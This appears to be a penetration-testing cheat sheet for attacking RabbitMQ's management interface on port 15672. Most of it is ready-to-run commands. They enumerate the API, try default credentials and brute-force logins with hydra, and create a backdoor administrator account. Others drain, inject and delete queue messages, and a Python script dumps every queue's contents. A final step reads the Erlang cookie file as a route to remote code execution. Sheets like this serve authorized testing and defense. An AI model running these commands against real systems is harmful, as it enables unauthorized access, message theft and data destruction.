# Port 15672 - RabbitMQ Management

## Table of Contents

- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Post Exploitation](#post-exploitation)

---

## Enumeration

### Nmap Scripts

```shell
nmap -sV -sC -p15672 $rhost
```

### Check Web Interface

```shell
curl http://$rhost:15672/
curl http://$rhost:15672/api/overview
```

### API Endpoints

```shell
# Overview (requires auth)
curl -u guest:guest http://$rhost:15672/api/overview

# List vhosts
curl -u guest:guest http://$rhost:15672/api/vhosts

# List users
curl -u guest:guest http://$rhost:15672/api/users

# List queues
curl -u guest:guest http://$rhost:15672/api/queues

# List exchanges
curl -u guest:guest http://$rhost:15672/api/exchanges

# List connections
curl -u guest:guest http://$rhost:15672/api/connections

# List channels
curl -u guest:guest http://$rhost:15672/api/channels
```

---

## Exploitation

### Default Credentials

```shell
# Default credentials
guest:guest

# Common credentials
admin:admin
rabbitmq:rabbitmq
```

### Brute Force

```shell
# Hydra
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $rhost http-get /api/whoami

# Custom script
for user in guest admin rabbitmq; do
  for pass in guest admin rabbitmq password; do
    if curl -s -u $user:$pass http://$rhost:15672/api/whoami | grep -q "name"; then
      echo "[+] Found: $user:$pass"
    fi
  done
done
```

### Create Admin User via API

```shell
# If you have admin access
curl -u admin:password -X PUT \
  -H "Content-Type: application/json" \
  -d '{"password":"hackerpass","tags":"administrator"}' \
  http://$rhost:15672/api/users/hacker
```

### Read Messages from Queue

```shell
# Get messages (destructive - removes from queue)
curl -u user:pass -X POST \
  -H "Content-Type: application/json" \
  -d '{"count":10,"ackmode":"ack_requeue_false","encoding":"auto"}' \
  http://$rhost:15672/api/queues/%2F/queue_name/get

# Get messages non-destructively
curl -u user:pass -X POST \
  -H "Content-Type: application/json" \
  -d '{"count":10,"ackmode":"ack_requeue_true","encoding":"auto"}' \
  http://$rhost:15672/api/queues/%2F/queue_name/get
```

### Publish Message to Queue

```shell
curl -u user:pass -X POST \
  -H "Content-Type: application/json" \
  -d '{"properties":{},"routing_key":"queue_name","payload":"malicious_message","payload_encoding":"string"}' \
  http://$rhost:15672/api/exchanges/%2F/amq.default/publish
```

---

## Post Exploitation

### Extract Sensitive Information

```shell
# List all users with tags
curl -u user:pass http://$rhost:15672/api/users | jq

# Get user permissions
curl -u user:pass http://$rhost:15672/api/users/admin/permissions | jq

# List all queues with message counts
curl -u user:pass http://$rhost:15672/api/queues | jq '.[] | {name, messages}'
```

### Dump All Messages

```python
#!/usr/bin/env python3
import requests
from requests.auth import HTTPBasicAuth

host = "TARGET_IP"  # Replace with target
user = "guest"
passwd = "guest"

# Get all queues
queues = requests.get(
    f"http://{host}:15672/api/queues",
    auth=HTTPBasicAuth(user, passwd)
).json()

for q in queues:
    queue_name = q['name']
    vhost = q['vhost'].replace('/', '%2F')
    
    # Get messages
    messages = requests.post(
        f"http://{host}:15672/api/queues/{vhost}/{queue_name}/get",
        auth=HTTPBasicAuth(user, passwd),
        json={"count": 1000, "ackmode": "ack_requeue_true", "encoding": "auto"}
    ).json()
    
    for msg in messages:
        print(f"Queue: {queue_name}")
        print(f"Payload: {msg['payload']}")
        print("---")
```

### Delete Queue

```shell
# Delete queue
curl -u user:pass -X DELETE \
  http://$rhost:15672/api/queues/%2F/queue_name
```

### Erlang Cookie Extraction

```shell
# If you have file access, extract erlang cookie
cat /var/lib/rabbitmq/.erlang.cookie

# Use for Erlang RCE (see port 4369 EPMD)
```

---

## Other RabbitMQ Ports

| Port | Service |
| --- | --- |
| 5672 | AMQP |
| 5671 | AMQP over TLS |
| 15672 | Management UI |
| 15671 | Management UI over TLS |
| 25672 | Erlang distribution |
| 4369 | EPMD |

---

## Tools

- RabbitMQ Management CLI: `rabbitmqadmin`
- pika (Python AMQP library)
- amqp-publish/amqp-consume

---

## References

- [HackTricks - RabbitMQ](https://book.hacktricks.wiki/network-services-pentesting/15672-pentesting-rabbitmq-management.html)
- [RabbitMQ Management HTTP API](https://rawcdn.githack.com/rabbitmq/rabbitmq-management/v3.8.5/priv/www/api/index.html)
